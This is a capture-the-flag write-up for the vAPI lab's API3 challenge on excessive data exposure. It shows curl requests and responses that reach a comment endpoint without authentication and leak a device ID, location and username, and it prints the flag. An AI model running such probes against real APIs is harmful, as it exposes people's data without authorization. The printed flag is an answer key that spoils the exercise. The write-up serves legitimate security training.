> We have all been there , right? Giving away too much data and the Dev showing it . Try the Android App in the Resources folder

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
```

# Create User
## POST /vapi/api3/user

Create a user
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"\",\x0d\x0a    \"password\":\"\",\x0d\x0a    \"name\":\"\"\x0d\x0a}' \
    $'http://localhost/vapi/api3/user'
```
```http
HTTP/1.1 201 Created
Host: localhost
Date: Wed, 26 Jun 2024 16:16:46 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 16:16:46 GMT
Content-Type: application/json

{"username":"","name":"","id":2}
```

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"myusername\",\x0d\x0a    \"password\":\"mypassword\",\x0d\x0a    \"name\":\"myname\"\x0d\x0a}' \
    $'http://localhost/vapi/api3/user'
```
```http
HTTP/1.1 201 Created
Host: localhost
Date: Wed, 26 Jun 2024 16:20:41 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 16:20:41 GMT
Content-Type: application/json

{"username":"myusername","name":"myname","id":11}
```

# Get Comment
## GET /vapi/api3/comment

Supposedly this was meant to be sent from using the mobile application, but I was too lazy to set up Android Studio

Get comment.
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Host: localhost' -H $'Content-Length: 4' \
    --data-binary $'{\x0d\x0a}' \
    $'http://localhost/vapi/api3/comment'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Wed, 26 Jun 2024 16:26:50 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 16:26:50 GMT
Content-Type: application/json

[{"id":1,"postid":"1","deviceid":"flag{api3_0bad677bfc504c75ff72}","latitude":"45.5426274","longitude":"-122.7944111","commenttext":"THIS POST IS SH***Y","username":"baduser007"}]
```

- Observe that even without authentication, we are able to get a response from the application showing the comment.
- Observe that the comment provides an excessive information such as "deviceid"

API3 Flag
```
flag{api3_0bad677bfc504c75ff72}
```

References:
https://zerodayhacker.com/using-an-android-emulator-for-api-hacking/
https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/